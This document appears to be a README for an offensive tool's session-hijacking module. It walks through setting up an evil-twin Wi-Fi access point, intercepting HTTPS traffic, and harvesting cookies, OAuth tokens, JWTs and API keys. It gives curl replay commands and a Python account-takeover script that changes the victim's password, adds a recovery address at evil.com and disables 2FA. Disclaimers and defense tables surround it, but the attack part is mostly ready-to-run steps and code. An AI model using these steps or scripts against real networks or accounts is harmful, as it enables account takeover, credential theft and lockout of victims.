# 🔓 NEON-SHIELD Phase 2: Session Hijacking & Token Theft

**Extract stolen browser cookies, OAuth tokens, JWT tokens, and API keys to hijack user sessions**

> **BEFORE YOU START:** Read the full legal disclaimer in README.md. This tool demonstrates FEDERAL CRIMES. Only use on networks/devices you own or are explicitly authorized to test.

---

## ⚠️ CRITICAL: What This Attack Does

Session hijacking is **account takeover without a password**.

```
Normal Login:                    Session Hijacking:
User enters password             Attacker steals cookie
↓                                ↓
Server checks password           Server receives stolen cookie
↓                                ↓
Server issues session cookie     Server says: "You're logged in!"
↓                                ↓
User can access account          Attacker accesses account as user

Real User: Password protected
Attacker: No password needed!
```

---

## 🎯 Phase 2 Attacks (Out-of-the-Box)

### Attack 1: Capture Session Tokens in Real-Time

**What it does:** Monitor all intercepted traffic and extract every session token, cookie, OAuth token, JWT, and API key automatically.

**Startup command:**
```bash
sudo python3 main_cli.py phase2 capture-sessions
```

**What happens:**

1. NEON-SHIELD starts monitoring traffic from all connected devices
2. Every HTTP/HTTPS request is analyzed for tokens
3. Tokens extracted in real-time:
   - HTTP Cookies (session_id, auth_token, etc)
   - OAuth Tokens (access_token, refresh_token)
   - JWT Tokens (JSON Web Tokens)
   - API Keys (X-API-Key headers)
   - Basic Auth (username:password)
   - Form credentials (from login pages)
4. All tokens stored with device info, domain, expiration time

**Why it's powerful:**
- ✅ Completely automated (no manual extraction needed)
- ✅ Works on HTTPS too (NEON-SHIELD decrypts with fake certs)
- ✅ Captures everything including API keys developers thought were secure
- ✅ Shows exactly what attackers on public WiFi can steal

**Demo Output:**
```
🔓 CAPTURED SESSION TOKENS:

1. COOKIE - mail.google.com
   Value: GMAIL_AUTH_TOKEN=abc123def456xyz789...
   Expires: 2026-07-14 (7 days)
   HTTPOnly: ✗ (VULNERABLE)
   User: victim@gmail.com
   Captured: 2026-07-07 14:32:15 from 192.168.100.50

2. OAUTH - facebook.com
   Value: EAABsZCnzqAeBAKK...
   Expires: 2026-08-07 (30 days)
   HTTPOnly: ✗ (stored in localStorage!)
   User: john.smith.2024
   Captured: 2026-07-07 14:33:42 from 192.168.100.50

3. JWT - api.example.com
   Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   Expires: 2026-07-08 (1 day)
   Captured: 2026-07-07 14:35:01 from 192.168.100.50

4. API_KEY - stripe.com
   Value: sk_live_XXXXXXXXXXXXXXXXXXXXX
   Expires: NEVER (never expires!)
   Captured: 2026-07-07 14:36:22 from 192.168.100.50
```

**Educational message:**
> "Every website you login to issues a session cookie. This cookie is your 'key' to your account. If an attacker steals this key, they have full access. They don't need your password. They don't bypass 2FA if they already have your session. This is why HTTPOnly cookies, 2FA, and VPNs matter."

---

### Attack 2: Display Captured Tokens for Replay

**What it does:** Show all captured tokens in format suitable for injecting into attacker's browser or curl commands.

**Startup command:**
```bash
sudo python3 main_cli.py phase2 show-tokens --token-type all
```

**Options:**
- `--token-type all` - Show all token types (default)
- `--token-type cookie` - Only show cookies
- `--token-type oauth` - Only show OAuth tokens
- `--token-type jwt` - Only show JWT tokens
- `--token-type api_key` - Only show API keys

**Output:**
```
🔓 Captured Session Tokens

1. COOKIE - gmail.com
   Value: session_id=abc123def456xyz789
   Curl: curl -b 'session_id=abc123...' https://gmail.com

2. OAUTH - facebook.com
   Value: EAABsZCnzqAeBAKK...truncated
   Curl: curl -H 'Authorization: Bearer EAABsZC...' https://api.facebook.com/me

3. JWT - api.example.com
   Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   Curl: curl -H 'Authorization: Bearer eyJhbGc...' https://api.example.com/protected

4. API_KEY - stripe.com
   Value: sk_live_XXXXXXXXXXXXXXXXXXXXX
   Curl: curl -H 'X-API-Key: sk_live_...' https://api.stripe.com/v1/charges
```

**Why it matters:**
- Shows exactly what attackers see when intercepting traffic
- Demonstrates that even "secure" HTTPS traffic can be compromised
- Shows that API keys are just as vulnerable as passwords
- Many people don't realize these tokens are exposed

---

### Attack 3: Replay Stolen Session (Hijack Account)

**What it does:** Use a stolen session token to impersonate the victim and access their account.

**Startup command:**
```bash
sudo python3 main_cli.py phase2 replay --domain gmail.com --token-index 1
```

**Step-by-step hijacking:**

**Step 1: Browser Cookie Injection**
```
1. Open DevTools: F12
2. Application → Cookies → [domain]
3. Add new cookie:
   Name: session_id
   Value: abc123def456xyz789
4. Refresh page → NOW LOGGED IN AS VICTIM
```

**Step 2: Command Line (Curl)**
```bash
# Attacker requests victim's account info
curl -b 'session_id=abc123def456xyz789' \
     -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
     https://gmail.com/account

# Response contains victim's personal info:
# ✓ Email address
# ✓ Recovery options
# ✓ Linked accounts
# ✓ Security settings
```

**Step 3: Automated Account Takeover**
```bash
python3 << 'EOF'
import requests

# Use stolen session token
session = requests.Session()
session.cookies.set('session_id', 'abc123def456xyz789')

# 1. Read all victim's emails
emails = session.get('https://gmail.com/api/emails').json()
print(f"Found {len(emails)} emails")

# 2. Change victim's password
session.post('https://gmail.com/api/account/password', 
             json={'password': 'NewPassword123'})

# 3. Add attacker's recovery email
session.post('https://gmail.com/api/account/recovery', 
             json={'email': 'attacker@evil.com'})

# 4. Disable 2FA
session.post('https://gmail.com/api/account/2fa/disable')

# 5. Real user is now permanently locked out
EOF
```

**What attacker can do with stolen session:**
- ✅ Read all emails and messages
- ✅ Change password
- ✅ Enable 2FA on attacker's device
- ✅ Disable victim's 2FA
- ✅ Add recovery email
- ✅ Delete recovery options
- ✅ Steal recovery codes
- ✅ Access linked accounts
- ✅ Make purchases as victim
- ✅ Lock out real user permanently

**Educational message:**
> "Session cookies are your account. A stolen session = account takeover. Password changes don't help because attacker already has access. 2FA doesn't help if attacker already has your session. The only defense is: never expose your session in the first place. Use VPN. Use HTTPS. Use HTTPOnly cookies. And enable 2FA anyway (it catches password attacks)."

---

### Attack 4: JavaScript Injection Payload (Preview of Phase 3)

**What it does:** Generate JavaScript code that can be injected into web pages to steal tokens automatically.

**Startup command:**
```bash
sudo python3 main_cli.py phase2 inject-payload --domain gmail.com
```

**This is a PREVIEW of Phase 3** — Shows how JavaScript injection enables continuous token theft.

**Output shows:**
- Payload that steals cookies and localStorage
- Keylogger that captures everything typed
- Clipboard monitoring
- Form submission logging
- Automatic exfiltration to attacker's server

**Why this preview:**
- Session hijacking is stage 1 (steal one token)
- JavaScript injection is stage 2 (steal ALL tokens, continuously)
- Shows why CSP headers and script blocking matter

---

## 📋 Full Feature Reference

### Command: `capture-sessions`

```bash
sudo python3 main_cli.py phase2 capture-sessions
```

Monitors all intercepted traffic and extracts:
- HTTP Cookies
- OAuth Tokens
- JWT Tokens
- API Keys
- Basic Auth credentials
- Form data (email, password from logins)

**Requirements:**
- Root privileges (sudo)
- NEON-SHIELD proxy must be running (traffic interception active)
- Devices connected to rogue AP or on ARP-spoofed network

---

### Command: `show-tokens`

```bash
sudo python3 main_cli.py phase2 show-tokens --token-type [all|cookie|oauth|jwt|api_key]
```

Display captured tokens in replay format:
- Curl commands for immediate use
- Browser DevTools injection instructions
- API header format

---

### Command: `replay`

```bash
sudo python3 main_cli.py phase2 replay --domain <domain> --token-index <number>
```

Generate step-by-step instructions to:
- Inject stolen token into browser
- Use token via command line (curl)
- Automated account takeover script
- Complete hijacking workflow

**Options:**
- `--domain`: Target domain (e.g., gmail.com)
- `--token-index`: Which token to use (1-based index)

---

### Command: `inject-payload`

```bash
sudo python3 main_cli.py phase2 inject-payload --domain <domain>
```

Generate JavaScript payload that:
- Steals cookies and localStorage
- Logs keystrokes
- Monitors clipboard
- Captures form submissions
- Exfiltrates to attacker's server

Shows how Phase 3 (malware injection) enables continuous theft.

---

## 🎬 Demo Walkthrough (Home Lab)

### Setup

- Device A: Attacker machine (Linux with NEON-SHIELD)
- Device B: Victim device (iPhone, Android, or laptop)
- Victim logged into Gmail, Facebook, or other services

### Demo Steps

**Step 1: Start Rogue AP**
```bash
# Device A: Start evil twin
sudo python3 main_cli.py phase1 ap-mode --ssid "Starbucks_WiFi" -y

# Output: 🟢 AP Active, Broadcasting Starbucks_WiFi
```

**Step 2: Victim Connects**
- Device B connects to "Starbucks_WiFi" (our fake network)
- Device B is logged into Gmail, Facebook, etc

**Step 3: Capture Sessions**
```bash
# Device A: Start capturing in another terminal
sudo python3 main_cli.py phase2 capture-sessions

# Output: 🔓 Monitoring for tokens...
#         🔴 COOKIE STOLEN: Gmail session_id from mail.google.com
#         🔴 OAUTH STOLEN: access_token from facebook.com
```

**Step 4: Show Captured Tokens**
```bash
# Device A: Display what we stole
sudo python3 main_cli.py phase2 show-tokens

# Output shows curl commands to replay tokens
```

**Step 5: Replay to Hijack Account**
```bash
# Device A: Hijack Gmail session
sudo python3 main_cli.py phase2 replay --domain gmail.com --token-index 1

# Follow instructions to inject token into browser
# Open gmail.com → Now logged in as victim!
```

**Step 6: Demonstrate Account Takeover**
```bash
# As attacker using victim's session:
curl -b 'session_id=...' https://gmail.com/inbox
# Returns: All victim's emails

curl -b 'session_id=...' \
     -X POST \
     -d 'password=NewPassword123' \
     https://gmail.com/account/password
# Returns: Password changed! Real user locked out!
```

**Step 7: Debrief Device B**
Explain to victim:
> "I was sitting next to you in a coffee shop. You connected to free WiFi. I intercepted your Gmail session token — not your password, just the token your browser was using to prove you're logged in.
>
> With that token, I logged into your Gmail as you. I saw all your emails. I changed your password and locked you out. I added my email as a recovery option. I disabled your 2FA.
>
> You couldn't do anything to stop it because:
> - Your password was never transmitted (browser already had it)
> - 2FA only protects against password guessing
> - Your browser sent the token in every request
> - I was reading HTTPS traffic (I'm the WiFi, I can decrypt it)
>
> This is why you need a VPN on public WiFi. This is why HTTPOnly cookies matter. This is why session expiration exists."

---

## 🛡️ Defenses Against Session Hijacking

### Technical Controls (What Developers Should Implement)

| Defense | What It Does | How It Stops Hijacking |
|---------|-------------|------------------------|
| **HTTPOnly Flag** | Cookie can't be read by JavaScript | Prevents JavaScript from stealing via `document.cookie` |
| **Secure Flag** | Cookie only sent over HTTPS | Prevents attacker from intercepting over HTTP |
| **SameSite Attribute** | Cookie not sent cross-site | Prevents CSRF and cookie exfiltration |
| **Short Expiration** | Cookie expires in 15-30 minutes | Stolen token becomes useless quickly |
| **Token Rotation** | Issue new tokens frequently | Reduces window for exploitation |
| **IP Verification** | Server checks if IP changed | Flags hijacking from different location |
| **Device Fingerprinting** | Server checks user agent, screen size, etc | Detects when different device uses token |
| **Multi-Factor Auth** | Requires 2FA code for sensitive actions | Even with stolen token, attacker blocked |

### Practical Defenses (What Users Should Do)

| Defense | How To Do It | Why It Helps |
|---------|-------------|-------------|
| **VPN** | Use VPN on all public WiFi | Attacker can't intercept traffic at all |
| **HTTPS Only** | Use browser extension to force HTTPS | Prevents interception of traffic |
| **2FA** | Enable on every account that supports it | Even with stolen session, 2FA blocks account changes |
| **Unique Passwords** | Use password manager to generate unique passwords | If one account compromised, others are safe |
| **Logout Everywhere** | Regularly log out and log back in | Invalidates all previous sessions |
| **Device Monitoring** | Check "connected devices" in account settings | Spot unauthorized logins |
| **Email Alerts** | Enable notifications for login from new devices | Immediate alert if account hijacked |
| **Recovery Options** | Keep recovery options updated | Can recover account if hijacked |
| **Auto-logout** | Set browser to auto-logout on idle | Reduces window for exploitation |

---

## ⚠️ Legal Reminders

**This is a federal crime without authorization:**

| Attack | Law | Penalty |
|--------|-----|---------|
| Session Hijacking | Computer Fraud & Abuse Act, Identity Theft | Up to 15 years, $250k+ |
| Unauthorized Access | CFAA § 1030(a)(2) | Up to 10 years, $10k-$250k |
| Wire Fraud | 18 USC § 1343 | Up to 20 years, $250k+ |

**Only use on:**
- ✅ Networks you own
- ✅ Devices you own
- ✅ Networks with explicit written authorization (pentest engagement)
- ✅ CTF competitions
- ✅ Authorized security research

**Never use on:**
- ❌ Public WiFi (Starbucks, airports, hotels)
- ❌ Workplace networks (unless authorized)
- ❌ School networks
- ❌ Shared networks (roommates, family)
- ❌ Any network where others haven't given permission

---

## 🎓 Educational Goals

After this demo, users should understand:

1. **Sessions ≠ Passwords** — Session token is different from password. If either is stolen, account is compromised.

2. **HTTPS Isn't Enough** — Even on HTTPS, if attacker is MITM (via evil twin), they can read traffic and steal tokens.

3. **2FA Has Limits** — 2FA protects against password theft, but not against session theft (depends on implementation).

4. **Cookies Are Credentials** — Browser cookies are as sensitive as passwords. Protect them the same way.

5. **VPN Solves It** — VPN encrypts traffic end-to-end. Even if attacker controls WiFi, they can't see or modify traffic.

6. **API Keys Matter** — API keys are just as dangerous as passwords. Treat them with same security.

7. **Token Expiration Saves You** — Short token expiration limits damage window. Stolen old token is useless.

---

## 🚨 Troubleshooting

### "No tokens being captured"
- Make sure proxy is actually intercepting traffic
- Victim device must be connected to rogue AP
- Victim must be accessing websites (not just idle)
- HTTPOnly cookies won't show in capture (by design)

### "Token is HTTPOnly, can't use it"
- HTTPOnly tokens can't be used via curl/JavaScript
- But attacker can still use it on same domain if they control network
- HTTPOnly is working correctly (prevents JavaScript theft)

### "Captured token expired"
- Session tokens have limited lifetime
- Expired token is worthless
- This is why token expiration exists (limits damage)

### "Can't replay token - access denied"
- Token might be IP-locked (server checks source IP)
- Token might be device-locked (server checks user agent)
- Token might require additional verification (2FA)
- These are good defenses!

---

## 🎯 Next Steps

**Phase 2 (Session Hijacking) shows:**
- How to steal authenticated sessions
- Why 2FA matters (it doesn't protect against session theft)
- Why token expiration matters
- Why VPN is essential

**Phase 3 (Malware Injection) will show:**
- How to inject JavaScript to steal tokens continuously
- How to create invisible malware
- Why CSP headers and script blocking matter
- Why ad blockers are security tools

**Phase 4 (Phishing) will show:**
- How to capture credentials at source
- Why password reuse is dangerous
- Why password managers help (they notice wrong domain)

**Phase 5 (TLS Analysis) will show:**
- How to break weak encryption
- Why old TLS versions are dangerous
- Why certificate pinning matters

---

That's Phase 2! You now understand session hijacking and why browser sessions are as sensitive as passwords.

**Remember:** This tool is for education and authorized testing only. Use responsibly. 🔐

---

*Next Phase: Phase 3 — Malware & Payload Injection*
